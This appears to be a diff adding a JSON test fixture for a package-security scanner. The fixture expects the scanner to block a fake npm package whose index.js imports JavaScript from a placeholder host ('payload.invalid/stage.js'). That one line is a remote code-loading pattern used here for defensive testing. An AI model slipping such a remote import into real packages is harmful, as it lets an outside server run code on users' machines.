@@ -1,0 +1,13 @@
+{
+  "name": "remote-dynamic-import",
+  "expect": "block",
+  "expectFinding": "remote-code-load",
+  "note": "runtime entrypoint imports executable JavaScript directly from a remote origin",
+  "evidence": {
+    "packageName": "remote-import-loader",
+    "sourceFiles": {
+      "package.json": "{\"name\":\"remote-import-loader\",\"version\":\"1.0.0\",\"main\":\"index.js\"}",
+      "index.js": "module.exports = import('https://payload.invalid/stage.js')"
+    }
+  }
+}
